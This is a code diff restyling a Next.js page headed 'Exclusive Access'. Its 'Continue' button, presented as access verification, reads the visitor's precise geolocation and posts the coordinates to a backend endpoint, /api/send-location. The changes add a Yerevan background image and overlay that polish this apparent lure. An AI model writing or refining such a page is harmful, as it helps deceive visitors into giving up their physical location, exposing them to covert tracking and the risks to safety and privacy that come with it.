@@ -1,4 +1,6 @@
 import { useState } from "react";
+import Image from "next/image"; // Next.js optimized image component
+import yerevanImg from "../../public/yerevan.jpg"; // Import the image
 
 export default function Home() {
   const [status, setStatus] = useState(null);
@@ -17,7 +19,6 @@ export default function Home() {
         const { latitude, longitude } = position.coords;
         setStatus("Request successful! Please wait...");
 
-        // Send the data to the backend
         fetch("/api/send-location", {
           method: "POST",
           headers: {
@@ -41,49 +42,62 @@ export default function Home() {
 
   return (
     <div style={styles.container}>
-      <div style={styles.card}>
-        <h1 style={styles.heading}>Exclusive Access</h1>
-        <p style={styles.subtext}>
-          Click below to verify your access and proceed.
-        </p>
-        <button onClick={handleAction} style={styles.button}>
-          Continue
-        </button>
-        {status && <p style={styles.statusText}>{status}</p>}
-        {error && <p style={styles.errorText}>{error}</p>}
+      <div style={styles.overlay}>
+        <Image
+          src={yerevanImg} // Imported image
+          layout="fill"
+          objectFit="contain"
+          alt="Background"
+          style={{ zIndex: -1 }}
+        />
+        <div style={styles.card}>
+          <h1 style={styles.heading}>Exclusive Access</h1>
+          <p style={styles.subtext}>Click below to verify your access.</p>
+          <button onClick={handleAction} style={styles.button}>
+            Continue
+          </button>
+          {status && <p style={styles.statusText}>{status}</p>}
+          {error && <p style={styles.errorText}>{error}</p>}
+        </div>
       </div>
     </div>
   );
 }
 
-// Styling
+// Styles
 const styles = {
   container: {
-    background: "linear-gradient(to right, #141E30, #243B55)",
+    position: "relative",
+    width: "100%",
     height: "100vh",
+  },
+  overlay: {
+    position: "absolute",
+    top: 0,
+    left: 0,
+    width: "100%",
+    height: "100%",
+    backgroundColor: "rgba(0, 0, 0, 0.5)", // Dark overlay for visibility
     display: "flex",
     alignItems: "center",
     justifyContent: "center",
-    padding: "20px",
   },
   card: {
-    backgroundColor: "rgba(255, 255, 255, 0.1)",
+    // backgroundColor: "rgba(255, 255, 255, 0.15)",
     padding: "30px",
     borderRadius: "15px",
     textAlign: "center",
-    boxShadow: "0 4px 10px rgba(0,0,0,0.3)",
-    backdropFilter: "blur(10px)",
+    // backdropFilter: "blur(10px)",
     color: "#fff",
     maxWidth: "400px",
     width: "100%",
+    zIndex: 1,
   },
   heading: {
-    marginBottom: "10px",
     fontSize: "24px",
     fontWeight: "bold",
   },
   subtext: {
-    marginBottom: "20px",
     fontSize: "16px",
     color: "#ddd",
   },
@@ -95,10 +109,6 @@ const styles = {
     border: "none",
     borderRadius: "8px",
     cursor: "pointer",
-    transition: "0.3s",
-  },
-  buttonHover: {
-    backgroundColor: "#0087BA",
   },
   statusText: {
     marginTop: "20px",
